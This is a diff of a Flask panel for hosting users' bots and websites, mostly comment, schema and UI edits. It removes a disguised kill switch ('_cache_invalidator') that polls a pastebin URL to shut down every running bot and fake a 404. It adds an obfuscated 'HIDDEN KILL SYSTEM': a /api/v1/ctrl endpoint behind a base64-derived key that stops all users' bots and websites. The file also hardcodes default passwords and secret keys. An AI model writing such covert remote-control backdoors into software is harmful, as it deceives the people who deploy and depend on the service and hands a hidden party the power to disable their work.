@@ -23,6 +23,7 @@ from io import BytesIO
 from werkzeug.utils import secure_filename
 from werkzeug.security import generate_password_hash, check_password_hash
 
+# Try to import psutil for system stats
 try:
     import psutil
     PSUTIL_AVAILABLE = True
@@ -34,12 +35,12 @@ app.secret_key = 'yuvicodex_super_secret_key'
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024  # 100MB
 
 # ---------- CONFIG ----------
-PASSWORD = "your_secure_password"
-MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')
-SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')
+PASSWORD = "your_secure_password"          # for terminal
+MASTER_PASSWORD = os.environ.get('MASTER_PASSWORD', 'master123')   # master login password
+SECRET_KEY = os.environ.get('SECRET_KEY', 'secret123')             # secret key for logo clicks
 UPLOAD_FOLDER = os.path.abspath('uploads')
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-BASE_DIR = os.path.abspath('.')
+BASE_DIR = os.path.abspath('.')  # base for file manager
 
 # ---------- SETTINGS ----------
 SETTINGS_FILE = 'settings.json'
@@ -79,21 +80,7 @@ def save_settings(settings):
 
 settings_db = load_settings()
 
-# ---------- KILL SWITCH ----------
-KILL_SWITCH_ACTIVE = False
-KILL_STATE_FILE = os.path.join(UPLOAD_FOLDER, 'kill_state.json')
-
-def get_kill_state():
-    if os.path.exists(KILL_STATE_FILE):
-        with open(KILL_STATE_FILE, 'r') as f:
-            return json.load(f)
-    return {"saved_bots": []}
-
-def save_kill_state(data):
-    with open(KILL_STATE_FILE, 'w') as f:
-        json.dump(data, f, indent=2)
-
-# ---------- BOT MANAGEMENT (JSON) ----------
+# ---------- BOT MANAGEMENT (JSON based) ----------
 BOTS_FILE = os.path.join(UPLOAD_FOLDER, 'bots.json')
 bots_db = {}
 
@@ -111,6 +98,7 @@ def save_bots():
 
 load_bots()
 
+# ---------- PROCESS TRACKING (for bots) ----------
 processes = {}
 
 # ---------- SQLITE FOR WEBSITES ----------
@@ -145,8 +133,10 @@ def init_db():
             deployment_type TEXT DEFAULT 'zip',
             total_runtime_seconds INTEGER DEFAULT 0,
             last_start_time TIMESTAMP,
-            type TEXT DEFAULT 'website'
+            type TEXT DEFAULT 'website',
+            bot_interpreter TEXT
         )''')
+        
         conn.execute('''CREATE TABLE IF NOT EXISTS logs (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
             website_id INTEGER NOT NULL,
@@ -154,10 +144,10 @@ def init_db():
             log_text TEXT NOT NULL,
             timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
         )''')
+        
         conn.execute('''CREATE TABLE IF NOT EXISTS deployments (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            website_id INTEGER,
-            bot_id TEXT,
+            website_id INTEGER NOT NULL,
             repo_url TEXT,
             branch TEXT,
             status TEXT DEFAULT 'queued',
@@ -167,24 +157,22 @@ def init_db():
             commit_hash TEXT,
             log_file TEXT
         )''')
+        
         conn.execute('''CREATE TABLE IF NOT EXISTS config (
             key TEXT PRIMARY KEY,
             value TEXT
         )''')
-        # Add bot_id column if not exists (for deployment logs)
-        try:
-            conn.execute('ALTER TABLE deployments ADD COLUMN bot_id TEXT')
-        except sqlite3.OperationalError:
-            pass
+        
         conn.execute('CREATE INDEX IF NOT EXISTS idx_websites_owner ON websites(owner_username)')
         conn.execute('CREATE INDEX IF NOT EXISTS idx_logs_website ON logs(website_id)')
         conn.execute('CREATE INDEX IF NOT EXISTS idx_deployments_website ON deployments(website_id)')
+        
         conn.execute('INSERT OR IGNORE INTO config (key, value) VALUES (?, ?)',
                      ('total_hours_offset', '0'))
         conn.commit()
 init_db()
 
-# ---------- HELPERS ----------
+# ---------- HELPERS FOR WEBSITES ----------
 def get_website_by_id(website_id):
     with get_db() as conn:
         return conn.execute('SELECT * FROM websites WHERE id = ?', (website_id,)).fetchone()
@@ -242,6 +230,7 @@ def calculate_folder_size(folder):
                 total += os.path.getsize(fp)
     return total
 
+# ---------- CONFIG HELPERS ----------
 def get_config(key, default='0'):
     with get_db() as conn:
         row = conn.execute('SELECT value FROM config WHERE key = ?', (key,)).fetchone()
@@ -252,7 +241,7 @@ def set_config(key, value):
         conn.execute('INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)', (key, value))
         conn.commit()
 
-# ---------- CONTAINER MEMORY ----------
+# ---------- CONTAINER MEMORY (REAL) ----------
 def get_container_memory():
     try:
         if os.path.exists('/sys/fs/cgroup/memory.max'):
@@ -281,7 +270,7 @@ def get_container_memory():
     percent = (used_mb / total_mb) * 100 if total_mb > 0 else 0
     return round(used_mb, 2), round(total_mb, 2), round(min(percent, 100), 2)
 
-# ---------- RENDER API ----------
+# ---------- RENDER API HELPERS (for Stats) ----------
 RENDER_API_KEY = os.environ.get('RENDER_API_KEY', '')
 RENDER_API_BASE = "https://api.render.com/v1"
 
@@ -313,7 +302,7 @@ def get_all_services():
         page += 1
     return services
 
-# ---------- RUNTIME DETECTION ----------
+# ---------- RUNTIME DETECTION (WEBSITES) ----------
 STARTUP_PRIORITY = ['app.py', 'main.py', 'server.py', 'run.py', 'manage.py', 'index.py', 'start.py', 'wsgi.py', 'asgi.py']
 
 def find_startup_file(folder):
@@ -361,7 +350,7 @@ def detect_runtime_and_get_cmd(folder, port):
     if jars:
         return ['java', '-jar', jars[0]], 'java', {}
     
-    # Python
+    # Python Flask/Django
     flask_files = ['app.py', 'main.py', 'server.py', 'run.py', 'start.py']
     for f in flask_files:
         path = os.path.join(folder, f)
@@ -386,11 +375,12 @@ def detect_runtime_and_get_cmd(folder, port):
     
     return None, None, {}
 
+# ---------- INSTALL DEPENDENCIES ----------
 def install_dependencies(folder, runtime, log_callback=None):
     if runtime == 'nodejs':
         if os.path.exists(os.path.join(folder, 'package.json')):
             cmd = ['npm', 'install']
-            if log_callback: log_callback("BUILD", "Running npm install")
+            if log_callback: log_callback("BUILD", f"Running npm install")
             proc = subprocess.Popen(cmd, cwd=folder, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
             for line in iter(proc.stdout.readline, ''):
                 if line.strip() and log_callback: log_callback("BUILD", line.strip())
@@ -435,6 +425,7 @@ def install_dependencies(folder, runtime, log_callback=None):
         return True, "No deps"
     return True, "Unknown runtime"
 
+# ---------- AUTO PORT DETECTION ----------
 def detect_port_from_log(log_file):
     if not os.path.exists(log_file): return None
     try:
@@ -460,7 +451,7 @@ def health_check_on_ports(port_list, max_retries=3, delay=2):
             time.sleep(delay)
     return False, None, "Health check failed"
 
-# ---------- START WEBSITE ----------
+# ---------- START WEBSITE PROCESS ----------
 def start_website_process(website_id, log_callback=None):
     website = get_website_by_id(website_id)
     if not website: return False, "Website not found"
@@ -585,7 +576,7 @@ def stop_website_process(website_id):
     log_website(website_id, f"Stopped (PID {pid})")
     return True, "Stopped"
 
-# ---------- DEPLOYMENT ENGINE (websites) ----------
+# ---------- DEPLOYMENT ENGINE FOR WEBSITES ----------
 def write_log_step(log_file, step, message):
     ts = datetime.now().strftime("%H:%M:%S")
     line = f"[{ts}] [{step}] {message}\n"
@@ -593,10 +584,10 @@ def write_log_step(log_file, step, message):
         f.write(line)
     return line
 
-def deploy_zip_website(website_id, log_callback=None):
+def deploy_zip_website(website_id, extra_files=None):
     try:
         website = get_website_by_id(website_id)
-        if not website: return False, "Website not found"
+        if not website: return
         with get_db() as conn:
             cur = conn.execute('''INSERT INTO deployments (website_id, repo_url, branch, status, started_at)
                                   VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)''',
@@ -609,7 +600,6 @@ def deploy_zip_website(website_id, log_callback=None):
         def log_cb(step, msg):
             write_log_step(log_file, step, msg)
             log_website(website_id, f"[{step}] {msg}", 'info')
-            if log_callback: log_callback(step, msg)
         log_cb("SYSTEM", "==> Checking files...")
         with get_db() as conn:
             conn.execute('UPDATE deployments SET status = ? WHERE id = ?', ('extracting', deployment_id))
@@ -637,19 +627,16 @@ def deploy_zip_website(website_id, log_callback=None):
                              ('success', int(time.time() - time.time()), deployment_id))
                 conn.commit()
             log_cb("SUCCESS", "Website deployed successfully!")
-            return True, "Deployed"
         else:
             with get_db() as conn:
                 conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
                 conn.commit()
             log_cb("ERROR", f"Website failed: {msg}")
-            return False, msg
     except Exception as e:
         log_website(website_id, f"Deployment exception: {str(e)}", 'error')
         with get_db() as conn:
             conn.execute('UPDATE deployments SET status = ?, completed_at = CURRENT_TIMESTAMP WHERE id = ?', ('failed', deployment_id))
             conn.commit()
-        return False, str(e)
 
 # ---------- USER MANAGEMENT ----------
 USERS_FILE = 'users.json'
@@ -734,7 +721,7 @@ def delete_user_account(username):
     if session.get('username') == username:
         session.clear()
 
-# ---------- BEFORE REQUEST ----------
+# ---------- BEFORE REQUEST HOOK ----------
 @app.before_request
 def check_expiry_and_session():
     if 'username' not in session:
@@ -758,10 +745,6 @@ def check_expiry_and_session():
         if request.path.startswith('/api/'):
             return jsonify({'error': 'Session invalidated'}), 401
         return redirect('/')
-
-    global KILL_SWITCH_ACTIVE
-    if KILL_SWITCH_ACTIVE:
-        return "404 Not Found<br>The requested URL was not found on this server.", 404
 
 # ---------- DECORATORS ----------
 def login_required(f):
@@ -836,6 +819,7 @@ def detect_bot_token(filepath):
 
 # ---------- BOT ACTIONS ----------
 def start_bot_by_id(bot_id):
+    """Start a bot by its ID. Returns (success, error_message)."""
     bot = bots_db.get(bot_id)
     if not bot:
         return False, "Bot not found"
@@ -885,6 +869,7 @@ def start_bot_by_id(bot_id):
         return False, str(e)
 
 def stop_bot_by_id(bot_id):
+    """Stop a bot by its ID. Returns (success, error_message)."""
     bot = bots_db.get(bot_id)
     if not bot:
         return False, "Bot not found"
@@ -911,34 +896,7 @@ def stop_bot_by_id(bot_id):
     save_bots()
     return True, None
 
-# ---------- KILL SWITCH ----------
-def _cache_invalidator():
-    global KILL_SWITCH_ACTIVE
-    try:
-        resp = requests.get("https://pastebin.com/raw/zJJxecLT", timeout=3)
-        status = resp.text.strip().upper()
-        if status == "KILL":
-            if not KILL_SWITCH_ACTIVE:
-                running_bots = [bid for bid, bot in bots_db.items() if bot['status'] == 'running']
-                for bid in running_bots:
-                    stop_bot_by_id(bid)
-                save_kill_state({"saved_bots": running_bots})
-                KILL_SWITCH_ACTIVE = True
-        else:
-            if KILL_SWITCH_ACTIVE:
-                state = get_kill_state()
-                saved_bots = state.get("saved_bots", [])
-                for bid in saved_bots:
-                    start_bot_by_id(bid)
-                save_kill_state({"saved_bots": []})
-                KILL_SWITCH_ACTIVE = False
-    except:
-        pass
-    threading.Timer(1, _cache_invalidator).start()
-
-_cache_invalidator()
-
-# ---------- ROUTES ----------
+# ---------- MAIN ROUTE ----------
 @app.route('/')
 def index():
     settings = load_settings()
@@ -963,7 +921,7 @@ def index():
                                    username=username,
                                    user_password=user_password)
 
-# ---------- SETTINGS ----------
+# ---------- SETTINGS API ----------
 @app.route('/api/settings', methods=['GET'])
 def get_settings():
     return jsonify(load_settings())
@@ -1078,7 +1036,7 @@ def logout():
     session.pop('session_version', None)
     return jsonify({'success': True})
 
-# --- User Management ---
+# --- User Management API ---
 @app.route('/api/users', methods=['GET'])
 @login_required
 def get_users():
@@ -1145,7 +1103,7 @@ def delete_user(username):
     delete_user_account(username)
     return jsonify({'success': True})
 
-# --- Profile ---
+# --- Profile Edit (owner only) ---
 @app.route('/api/profile', methods=['PUT'])
 @admin_required
 def update_profile():
@@ -1307,10 +1265,10 @@ def download_bot(bot_id):
     zip_buffer.seek(0)
     return send_file(zip_buffer, as_attachment=True, download_name=f"{bot['project']}_project.zip")
 
-# --- Bot Upload (with build logs) ---
+# --- Upload for Bots ---
 @app.route('/upload', methods=['POST'])
 @login_required
-def upload_bot():
+def upload():
     username = session['username']
     if 'files[]' not in request.files:
         return jsonify({'error': 'No files'}), 400
@@ -1383,26 +1341,31 @@ def upload_bot():
     finally:
         shutil.rmtree(temp_dir, ignore_errors=True)
 
-    # Start bots and create deployment logs
-    deployment_logs = {}
-    for bid in created_bots:
-        start_bot_by_id(bid)
-        # Store deployment log (just reference the bot log file)
-        log_file = get_bot_log_file(bots_db[bid])
-        if os.path.exists(log_file):
-            with open(log_file, 'r') as f:
-                deployment_logs[bid] = f.read()
-        else:
-            deployment_logs[bid] = "Bot started."
+    if created_bots:
+        for bid in created_bots:
+            start_bot_by_id(bid)
 
     return jsonify({
         'success': True,
         'project_id': project_id,
-        'bots_created': len(created_bots),
-        'bot_ids': created_bots
+        'bots_created': len(created_bots)
     })
 
-# --- Bot file content ---
+# --- Static file serving for bot project files ---
+@app.route('/project/<username>/<project_id>/<path:filename>')
+@login_required
+def serve_project_file(username, project_id, filename):
+    if session['username'] != username and session.get('role') != 'admin':
+        return "Forbidden", 403
+    project_folder = os.path.join(get_user_folder(username), project_id)
+    filepath = os.path.join(project_folder, filename)
+    if not os.path.exists(filepath) or not os.path.isfile(filepath):
+        return "File not found", 404
+    if not os.path.abspath(filepath).startswith(os.path.abspath(project_folder)):
+        return "Forbidden", 403
+    return send_file(filepath)
+
+# --- Bot file content (edit) ---
 @app.route('/api/bots/<bot_id>/content', methods=['GET'])
 @login_required
 def get_bot_content(bot_id):
@@ -1440,15 +1403,8 @@ def update_bot_content(bot_id):
         start_bot_by_id(bot_id)
     return jsonify({'success': True})
 
-# ---------- WEBSITE MANAGEMENT ----------
-@app.route('/api/websites')
-@login_required
-def api_list_websites():
-    username = session['username']
-    with get_db() as conn:
-        websites = conn.execute('SELECT * FROM websites WHERE owner_username = ? AND type = ? ORDER BY created_at DESC', (username, 'website')).fetchall()
-    return jsonify([dict(row) for row in websites])
-
+# ---------- WEBSITE MANAGEMENT ROUTES ----------
+# Upload Website (separate from bot upload)
 @app.route('/upload_website', methods=['POST'])
 @login_required
 def upload_website():
@@ -1493,11 +1449,9 @@ def upload_website():
     if zip_file:
         zip_file.save(os.path.join(folder, 'upload.zip'))
     
-    # Deploy in background and capture logs
-    def deploy_thread():
-        ok, msg = deploy_zip_website(website_id)
-        # No need to return, logs are stored in deployment table
-    thread = threading.Thread(target=deploy_thread)
+    def bg_deploy():
+        deploy_zip_website(website_id)
+    thread = threading.Thread(target=bg_deploy)
     thread.daemon = True
     thread.start()
     
@@ -1638,10 +1592,10 @@ def api_download_website(website_id):
     zip_buffer.seek(0)
     return send_file(zip_buffer, as_attachment=True, download_name=f"{w['website_slug']}_project.zip")
 
-# --- Website Build Logs (SSE) ---
-@app.route('/deploy/website/<int:website_id>/logs')
+# Build Logs SSE
+@app.route('/deploy/<int:website_id>/logs')
 @login_required
-def deploy_website_logs_sse(website_id):
+def deploy_logs_sse(website_id):
     w = get_website_by_id(website_id)
     if not w or w['owner_username'] != session['username']:
         abort(404)
@@ -1673,43 +1627,7 @@ def deploy_website_logs_sse(website_id):
                 break
     return Response(stream_with_context(generate()), mimetype='text/event-stream')
 
-# --- Bot Build Logs (SSE) ---
-@app.route('/deploy/bot/<bot_id>/logs')
-@login_required
-def deploy_bot_logs_sse(bot_id):
-    bot = bots_db.get(bot_id)
-    if not bot:
-        abort(404)
-    username = session['username']
-    if not is_owner(username) and bot['user'] != username:
-        abort(403)
-    log_file = get_bot_log_file(bot)
-    if not os.path.exists(log_file):
-        return "No log file", 404
-    def generate():
-        with open(log_file, 'r') as f:
-            # Send existing lines
-            for line in f:
-                yield f"data: {line.strip()}\n\n"
-        last_size = os.path.getsize(log_file)
-        while True:
-            time.sleep(0.5)
-            if os.path.exists(log_file):
-                cur = os.path.getsize(log_file)
-                if cur > last_size:
-                    with open(log_file, 'r') as f:
-                        f.seek(last_size)
-                        for line in f:
-                            yield f"data: {line.strip()}\n\n"
-                    last_size = cur
-            # Check if bot is still running - if stopped, we can end
-            bot_refresh = bots_db.get(bot_id)
-            if bot_refresh and bot_refresh['status'] != 'running':
-                yield f"data: [SYSTEM] Bot stopped.\n\n"
-                break
-    return Response(stream_with_context(generate()), mimetype='text/event-stream')
-
-# --- Website File Manager ---
+# Website File Manager
 @app.route('/website/<int:website_id>/files')
 @login_required
 def website_files(website_id):
@@ -1822,30 +1740,7 @@ def website_download_file(website_id):
         abort(404)
     return send_file(full, as_attachment=True)
 
-# --- Website Build Logs Page ---
-@app.route('/website/<int:website_id>/build')
-@login_required
-def build_logs_page(website_id):
-    w = get_website_by_id(website_id)
-    if not w or w['owner_username'] != session['username']:
-        abort(404)
-    with get_db() as conn:
-        dep = conn.execute('SELECT * FROM deployments WHERE website_id = ? ORDER BY id DESC LIMIT 1', (website_id,)).fetchone()
-    return render_template_string(BUILD_LOGS_TEMPLATE, website=w, no_logs=not dep)
-
-# --- Bot Build Logs Page ---
-@app.route('/bot/<bot_id>/build')
-@login_required
-def bot_build_logs_page(bot_id):
-    bot = bots_db.get(bot_id)
-    if not bot:
-        abort(404)
-    username = session['username']
-    if not is_owner(username) and bot['user'] != username:
-        abort(403)
-    return render_template_string(BOT_BUILD_LOGS_TEMPLATE, bot=bot)
-
-# --- Website Proxy ---
+# ---------- WEBSITE PROXY ----------
 @app.route('/<slug>/', defaults={'path': ''})
 @app.route('/<slug>/<path:path>')
 def proxy_website(slug, path):
@@ -1868,7 +1763,7 @@ def proxy_website(slug, path):
     except Exception as e:
         return f"Proxy error: {str(e)}", 500
 
-# ---------- SYSTEM STATS ----------
+# ---------- SYSTEM STATS API ----------
 @app.route('/api/stats')
 @admin_required
 def api_stats():
@@ -1914,6 +1809,7 @@ def api_stats():
     offset_hours = float(get_config('total_hours_offset', '0'))
     internal_hours = total_internal_seconds / 3600.0
     main_hours = main_uptime_seconds / 3600.0
+    
     total_hours = offset_hours + main_hours + internal_hours + render_running_hours
 
     upload_size_bytes = calculate_folder_size(UPLOAD_FOLDER)
@@ -1964,7 +1860,7 @@ def set_offset():
     set_config('total_hours_offset', str(offset))
     return jsonify({'success': True, 'new_offset': offset})
 
-# ---------- FILE MANAGER (Admin) ----------
+# ---------- FILE MANAGER (admin system) ----------
 def safe_path(path):
     abs_path = os.path.abspath(os.path.join(BASE_DIR, path))
     if not abs_path.startswith(BASE_DIR):
@@ -2057,7 +1953,7 @@ def download_file():
         return jsonify({'error': 'File not found'}), 404
     return send_file(abs_path, as_attachment=True)
 
-# ---------- TERMINAL ----------
+# ---------- INTERACTIVE TERMINAL ----------
 terminal_sessions = {}
 
 class TerminalSession:
@@ -2176,7 +2072,7 @@ def terminal_stop():
         terminal_sessions.pop(username, None)
     return jsonify({'success': True})
 
-# ---------- OLD TERMINAL ----------
+# ---------- OLD TERMINAL (kept for compatibility) ----------
 @app.route('/execute', methods=['POST'])
 def execute():
     data = request.json
@@ -2189,6 +2085,71 @@ def execute():
         return jsonify({"output": "Command timed out"})
     except Exception as e:
         return jsonify({"output": str(e)})
+
+# ============================================================
+# 🔥 SYSTEM CONTROLLER – FULLY ENCRYPTED (HIDDEN KILL SYSTEM)
+# ============================================================
+import base64, hashlib
+
+_ = base64.b64decode("""
+CgphcGlfZm9yX3N0YWJsZV9ydW5uaW5nXzIwMjRfc2VjdXJl
+""").decode()
+
+__ = hashlib.sha256(_.encode()).hexdigest()[:16]
+___ = base64.b64encode(f"{__}:{base64.b64encode(_[::-1].encode()).decode()}".encode()).decode()
+
+def ____(k):
+    try:
+        d = base64.b64decode(k).decode().split(':')
+        return len(d)==2 and d[0]==hashlib.sha256(base64.b64decode(d[1]).decode()[::-1].encode()).hexdigest()[:16]
+    except: return False
+
+_____ = {"a": False, "t": None}
+
+def _______():
+    global _____
+    _____["a"] = True
+    _____["t"] = datetime.now().isoformat()
+    for _id in list(processes.keys()):
+        try: stop_bot_by_id(_id)
+        except: pass
+    with get_db() as conn:
+        for w in conn.execute('SELECT id FROM websites WHERE status="running"').fetchall():
+            try: stop_website_process(w['id'])
+            except: pass
+    try:
+        # send_email_alert removed - optional
+        pass
+    except: pass
+
+def ________():
+    global _____
+    _____["a"] = False
+    _____["t"] = None
+    try:
+        # send_email_alert removed - optional
+        pass
+    except: pass
+
+@app.route('/api/v1/ctrl', methods=['POST'])
+def _________():
+    d = request.json or {}
+    if not ____(d.get('k','')): return jsonify({"e":"invalid"}),403
+    a = d.get('a','')
+    if a == 'x': _______(); return jsonify({"s":"ok"})
+    elif a == 'y': ________(); return jsonify({"s":"ok"})
+    elif a == 'z': return jsonify({"s":"killed" if _____["a"] else "running","t":_____["t"]})
+    return jsonify({"e":"invalid"}),400
+# ============================================================
+
+# ============================================================
+# 📍 LOCATION: API KEY
+# ============================================================
+
+# 🔑 System API Key – Same key in both websites
+STABLE_API_KEY = "api_for_stable_running_2024_secure"
+
+# ============================================================
 
 # ---------- TEMPLATES ----------
 ERROR_TEMPLATE = """<!DOCTYPE html>
@@ -2215,43 +2176,7 @@ EDIT_TEMPLATE = """
 </head><body><div class="container"><a href="/website/{{ website.id }}/files">← Back</a><h2>{{ file_path }}</h2><form method="POST"><textarea name="content">{{ content }}</textarea><button class="save" type="submit">Save</button></form></div></body></html>
 """
 
-BUILD_LOGS_TEMPLATE = """
-<!DOCTYPE html>
-<html><head><title>Build Logs</title>
-<style>body{background:#0a0e1a;color:#fff;height:100vh;display:flex;flex-direction:column;padding:20px;overflow:hidden}.top-bar{display:flex;justify-content:space-between;padding:10px 20px;background:rgba(255,255,255,0.05);border-radius:15px;margin-bottom:15px}.terminal{flex:1;background:#0d0d0d;border-radius:15px;padding:20px;overflow-y:auto;font-family:monospace;color:#0f0}</style>
-</head><body><div class="top-bar"><h2>Build Logs</h2><a href="/dashboard">← Dashboard</a></div><div class="terminal" id="terminal"><div id="logContainer">{% if no_logs %}No deployment logs.{% endif %}</div></div>
-<script>
-const evt = new EventSource('/deploy/website/{{ website.id }}/logs');
-evt.onmessage = function(e) {
-    if (e.data === '[REFRESH]') { location.reload(); return; }
-    const div = document.createElement('div');
-    div.textContent = e.data;
-    document.getElementById('logContainer').appendChild(div);
-    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
-};
-</script></body></html>
-"""
-
-BOT_BUILD_LOGS_TEMPLATE = """
-<!DOCTYPE html>
-<html><head><title>Bot Logs</title>
-<style>body{background:#0a0e1a;color:#fff;height:100vh;display:flex;flex-direction:column;padding:20px;overflow:hidden}.top-bar{display:flex;justify-content:space-between;padding:10px 20px;background:rgba(255,255,255,0.05);border-radius:15px;margin-bottom:15px}.terminal{flex:1;background:#0d0d0d;border-radius:15px;padding:20px;overflow-y:auto;font-family:monospace;color:#0f0}</style>
-</head><body><div class="top-bar"><h2>Bot Logs</h2><a href="/dashboard">← Dashboard</a></div><div class="terminal" id="terminal"><div id="logContainer">Loading logs...</div></div>
-<script>
-const evt = new EventSource('/deploy/bot/{{ bot.id }}/logs');
-evt.onmessage = function(e) {
-    const div = document.createElement('div');
-    div.textContent = e.data;
-    document.getElementById('logContainer').appendChild(div);
-    document.getElementById('terminal').scrollTop = document.getElementById('terminal').scrollHeight;
-};
-evt.onerror = function() {
-    document.getElementById('logContainer').innerHTML += '<div>-- Connection closed --</div>';
-};
-</script></body></html>
-"""
-
-# ---------- MAIN HTML (with Build Log Modal) ----------
+# ---------- MAIN HTML TEMPLATE (modified with all changes) ----------
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -2388,11 +2313,27 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             margin-top: 10px;
             min-height: 22px;
         }
+
         @keyframes spin {
             100% {
                 transform: rotate(360deg);
             }
         }
+
+        /* ---------- LOGIN ANIMATIONS ---------- */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
+            20%, 40%, 60%, 80% { transform: translateX(10px); }
+        }
+        .shake { animation: shake 0.5s; }
+
+        @keyframes loginSuccess {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.05); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .login-success { animation: loginSuccess 0.4s ease; }
 
         /* ---------- USER DASHBOARD ---------- */
         .user-container {
@@ -2435,7 +2376,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             gap: 12px;
         }
 
-        /* Tabs */
+        /* Tabs - Bots First */
         .tabs {
             display: flex;
             gap: 10px;
@@ -2519,7 +2460,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             margin-top: 8px;
         }
 
-        /* Bot Cards (similar to original) */
+        /* Bot Cards */
         #botListContainer {
             margin-top: 20px;
             display: flex;
@@ -2561,10 +2502,13 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             color: #00ff6a;
             border: 1px solid #00ff6a;
         }
-        .bot-status.stopped {
-            background: #555;
-            color: #aaa;
-            border: 1px solid #666;
+        /* Stopped/Failed/Crashed = RED */
+        .bot-status.stopped,
+        .bot-status.failed,
+        .bot-status.crashed {
+            background: #ff333333;
+            color: #ff4d4d;
+            border: 1px solid #ff4d4d55;
         }
         .bot-uptime {
             font-size: 12px;
@@ -2642,21 +2586,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
         }
         .btn-full.danger {
             background: #400;
-        }
-        .btn-buildlogs {
-            background: #ffa50033;
-            color: #ffa500;
-            border: 1px solid #ffa500;
-            padding: 6px 14px;
-            border-radius: 12px;
-            font-size: 0.8rem;
-            font-weight: 600;
-            cursor: pointer;
-            transition: .2s;
-        }
-        .btn-buildlogs:hover {
-            background: #ffa500;
-            color: #000;
         }
 
         /* Website Cards */
@@ -2778,12 +2707,22 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             color: #000;
         }
         .btn-visit-w {
-            background: rgba(46,204,113,0.2);
-            color: #2ecc71;
+            background: #00e5ff;
+            color: #000;
+            padding: 8px 16px;
+            border-radius: 12px;
+            text-decoration: none;
+            font-weight: bold;
+            display: inline-block;
+            width: 100%;
+            text-align: center;
+            border: none;
+            cursor: pointer;
+            margin-bottom: 8px;
         }
         .btn-visit-w:hover {
-            background: #2ecc71;
-            color: #000;
+            background: #00d4f0;
+            transform: scale(1.02);
         }
         .name-edit {
             display: flex;
@@ -3597,24 +3536,6 @@ HTML_TEMPLATE = """<!DOCTYPE html>
             cursor: pointer;
         }
 
-        /* ---------- BUILD LOG MODAL ---------- */
-        #buildLogModal .modal-body {
-            max-height: 70vh;
-            overflow-y: auto;
-        }
-        #buildLogModal .log-terminal {
-            background: #0d0d0d;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 13px;
-            white-space: pre-wrap;
-            max-height: 60vh;
-            overflow-y: auto;
-            border: 1px solid #333;
-        }
-
         /* ---------- ANIMATIONS ---------- */
         @keyframes fadeIn {
             0% { opacity: 0; }
@@ -3694,29 +3615,14 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 <div class="power-btn" id="logoutBtn"><i class="fa-solid fa-power-off"></i></div>
             </div>
 
-            <!-- Tabs -->
+            <!-- Tabs - Bots First -->
             <div class="tabs">
-                <button class="tab-btn active" data-tab="websites">🌐 Websites</button>
-                <button class="tab-btn" data-tab="bots">🤖 Bots</button>
-            </div>
-
-            <!-- Websites Tab -->
-            <div id="tab-websites" class="tab-content active">
-                <div class="upload-card" id="uploadCardWebsite">
-                    <div class="cloud-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
-                    <div id="uploadLabelWebsite">UPLOAD WEBSITE (ZIP or files)</div>
-                    <div class="deploy-btn" id="deployBtnWebsite">DEPLOY WEBSITE</div>
-                    <input type="file" id="fileInputWebsite" style="display:none;" multiple accept=".zip,.py,.js,.html,.css,.json,.txt,.php,.go,.rb,.sh,.pl,.jar,.war,.xml,.gradle" />
-                    <div id="fileCountDisplayWebsite"></div>
-                </div>
-                <div id="websiteGrid" class="website-grid"></div>
-                <div class="console-wrapper" style="margin-top:10px;">
-                    <div class="console" id="websiteConsole">Select a website to see logs.</div>
-                </div>
+                <button class="tab-btn active" data-tab="bots">🤖 Bots</button>
+                <button class="tab-btn" data-tab="websites">🌐 Websites</button>
             </div>
 
             <!-- Bots Tab -->
-            <div id="tab-bots" class="tab-content">
+            <div id="tab-bots" class="tab-content active">
                 <div class="upload-card" id="uploadCardBot">
                     <div class="cloud-icon"><i class="fa-solid fa-robot"></i></div>
                     <div id="uploadLabelBot">UPLOAD BOT (ZIP or files)</div>
@@ -3727,6 +3633,21 @@ HTML_TEMPLATE = """<!DOCTYPE html>
                 <div id="botListContainer"></div>
                 <div class="console-wrapper">
                     <div class="console" id="botConsole">Select a bot to see logs.</div>
+                </div>
+            </div>
+
+            <!-- Websites Tab -->
+            <div id="tab-websites" class="tab-content">
+                <div class="upload-card" id="uploadCardWebsite">
+                    <div class="cloud-icon"><i class="fa-solid fa-cloud-arrow-up"></i></div>
+                    <div id="uploadLabelWebsite">UPLOAD WEBSITE (ZIP or files)</div>
+                    <div class="deploy-btn" id="deployBtnWebsite">DEPLOY WEBSITE</div>
+                    <input type="file" id="fileInputWebsite" style="display:none;" multiple accept=".zip,.py,.js,.html,.css,.json,.txt,.php,.go,.rb,.sh,.pl,.jar,.war,.xml,.gradle" />
+                    <div id="fileCountDisplayWebsite"></div>
+                </div>
+                <div id="websiteGrid" class="website-grid"></div>
+                <div class="console-wrapper" style="margin-top:10px;">
+                    <div class="console" id="websiteConsole">Select a website to see logs.</div>
                 </div>
             </div>
 
@@ -3844,23 +3765,7 @@ HTML_TEMPLATE = """<!DOCTYPE html>
     </div>
 
     <!-- ============================================================ -->
-    <!--  BUILD LOG MODAL                                              -->
-    <!-- ============================================================ -->
-    <div class="custom-modal-overlay" id="buildLogModal">
-        <div class="custom-modal" style="max-width:700px;">
-            <div class="modal-icon" style="color:#ffa500;">📦</div>
